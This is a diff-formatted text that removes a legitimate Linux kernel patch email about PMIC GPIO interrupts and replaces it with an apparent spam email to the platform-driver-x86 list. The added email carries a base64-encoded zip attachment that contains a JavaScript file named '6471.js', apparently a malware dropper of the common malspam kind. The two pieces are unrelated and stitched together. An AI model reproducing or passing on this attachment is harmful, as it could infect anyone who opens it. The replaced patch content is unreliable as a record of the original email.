@@ -1,66 +1,83 @@
-From: sathyanarayanan.kuppuswamy@linux.intel.com
-Subject: [PATCH v1 4/7] mfd: intel_soc_pmic_bxtwc: remove second level irq for gpio device
-Date: Mon, 10 Apr 2017 11:52:26 -0700
-Message-ID: <50fd2e28a661a0b62f7d270a511a354d56d19bda.1491848776.git.sathyanarayanan.kuppuswamy@linux.intel.com>
-References: <b8e952de94ed1902b922224de11f0814371b08b0.1491848776.git.sathyanarayanan.kuppuswamy@linux.intel.com>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <b8e952de94ed1902b922224de11f0814371b08b0.1491848776.git.sathyanarayanan.kuppuswamy@linux.intel.com>
-Sender: linux-kernel-owner@vger.kernel.org
-To: gnurou@gmail.com, linus.walleij@linaro.org, edubezval@gmail.com, dvhart@infradead.org, rui.zhang@intel.com, lee.jones@linaro.org, andy@infradead.org, hdegoede@redhat.com
-Cc: linux-gpio@vger.kernel.org, platform-driver-x86@vger.kernel.org, linux-kernel@vger.kernel.org, linux-pm@vger.kernel.org, sathyaosid@gmail.com, Kuppuswamy Sathyanarayanan <sathyanarayanan.kuppuswamy@linux.intel.com>
-List-Id: platform-driver-x86.vger.kernel.org
+From: <sidery-d-request@rootsweb.com>
+Subject: 42182 platform-driver-x86
+Date: Tue, 11 Apr 2017 05:24:28 -0000
+Message-ID: <149188826839.2302.8260556192423239190@candw.ag>
+Reply-To: <sidery-d-request@rootsweb.com>
+Mime-Version: 1.0
+Content-Type: application/zip; name="8478517.zip"
+Content-Transfer-Encoding: base64
+Return-path: <platform-driver-x86-owner@vger.kernel.org>
+Received: from 206-214-6-223.candw.ag ([206.214.6.223]:38580 "HELO candw.ag"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752179AbdDKFZQ (ORCPT
+        <rfc822;platform-driver-x86@vger.kernel.org>);
+        Tue, 11 Apr 2017 01:25:16 -0400
+Content-Disposition: attachment
+Sender: platform-driver-x86-owner@vger.kernel.org
+List-ID: <platform-driver-x86.vger.kernel.org>
+To: platform-driver-x86@vger.kernel.org
 
-From: Kuppuswamy Sathyanarayanan <sathyanarayanan.kuppuswamy@linux.intel.com>
-
-Currently all PMIC GPIO domain irqs are consumed by the same
-device(bxt_wcove_gpio), so there is no need to export them as
-separate interrupts. We can just export only the first level
-GPIO irq(BXTWC_GPIO_LVL1_IRQ) as an irq resource and let the
-GPIO device driver(bxt_wcove_gpio) handle the GPIO sub domain
-irqs based on status value of GPIO level2 interrupt status
-register. Also, just using only the first level irq will eliminate
-the bug involved in requesting only the second level irq and not
-explicitly enable the first level irq. For more info on this
-issue please read the details at,
-
-https://lkml.org/lkml/2017/2/27/148
-
-Signed-off-by: Kuppuswamy Sathyanarayanan <sathyanarayanan.kuppuswamy@linux.intel.com>
----
- drivers/mfd/intel_soc_pmic_bxtwc.c | 7 +------
- 1 file changed, 1 insertion(+), 6 deletions(-)
-
-diff --git a/drivers/mfd/intel_soc_pmic_bxtwc.c b/drivers/mfd/intel_soc_pmic_bxtwc.c
-index c08d514..dc8af1d 100644
---- a/drivers/mfd/intel_soc_pmic_bxtwc.c
-+++ b/drivers/mfd/intel_soc_pmic_bxtwc.c
-@@ -88,8 +88,6 @@ enum bxtwc_irqs_level2 {
- 	BXTWC_USBC_IRQ,
- 	BXTWC_CHGR0_IRQ,
- 	BXTWC_CHGR1_IRQ,
--	BXTWC_GPIO0_IRQ,
--	BXTWC_GPIO1_IRQ,
- 	BXTWC_CRIT_IRQ,
- };
- 
-@@ -115,8 +113,6 @@ static const struct regmap_irq bxtwc_regmap_irqs_level2[] = {
- 	REGMAP_IRQ_REG(BXTWC_USBC_IRQ, 2, BIT(5)),
- 	REGMAP_IRQ_REG(BXTWC_CHGR0_IRQ, 2, 0x1f),
- 	REGMAP_IRQ_REG(BXTWC_CHGR1_IRQ, 3, 0x1f),
--	REGMAP_IRQ_REG(BXTWC_GPIO0_IRQ, 4, 0xff),
--	REGMAP_IRQ_REG(BXTWC_GPIO1_IRQ, 5, 0x3f),
- 	REGMAP_IRQ_REG(BXTWC_CRIT_IRQ, 6, 0x03),
- };
- 
-@@ -152,8 +148,7 @@ static struct regmap_irq_chip bxtwc_regmap_irq_chip_tmu = {
- };
- 
- static struct resource gpio_resources[] = {
--	DEFINE_RES_IRQ_NAMED(BXTWC_GPIO0_IRQ, "GPIO0"),
--	DEFINE_RES_IRQ_NAMED(BXTWC_GPIO1_IRQ, "GPIO1"),
-+	DEFINE_RES_IRQ_NAMED(BXTWC_GPIO_LVL1_IRQ, "GPIO"),
- };
- 
- static struct resource adc_resources[] = {
--- 
-2.7.4
+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
